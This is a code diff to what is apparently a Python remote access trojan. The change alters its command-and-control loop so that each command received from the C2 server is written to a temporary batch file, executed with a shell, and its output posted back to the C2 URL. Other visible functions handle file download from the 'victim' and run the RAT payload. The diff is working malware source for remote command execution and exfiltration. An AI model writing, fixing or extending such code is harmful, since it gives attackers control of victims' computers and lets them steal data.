@@ -152,6 +152,8 @@ def handle_download(filepath, c2_url):
     except Exception as e:
         post_results(f"[ERROR] File download failed: {str(e)}", c2_url)
 
+import tempfile
+
 def enter_active_c2_session(c2_url):
     consecutive_failures = 0
     while True:
@@ -181,9 +183,24 @@ def enter_active_c2_session(c2_url):
                 else:
                     post_results("Usage: download <filepath_on_victim>", c2_url)
             else:
-                output = subprocess.run(command, shell=True, capture_output=True)
-                result = (output.stdout + output.stderr)
-                post_results(result or b"[+] Command executed.", c2_url)
+                # FIX: Use temporary batch file for long commands
+                try:
+                    with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as bat_file:
+                        bat_file.write(command)
+                        bat_path = bat_file.name
+                    
+                    output = subprocess.run([bat_path], shell=True, capture_output=True)
+                    
+                    # Clean up the temp file
+                    try:
+                        os.unlink(bat_path)
+                    except:
+                        pass
+                    
+                    result = (output.stdout + output.stderr)
+                    post_results(result or b"[+] Command executed.", c2_url)
+                except Exception as e:
+                    post_results(f"[ERROR] Command execution failed: {str(e)}".encode(), c2_url)
         time.sleep(ACTIVE_INTERVAL)
 
 def run_rat_payload():
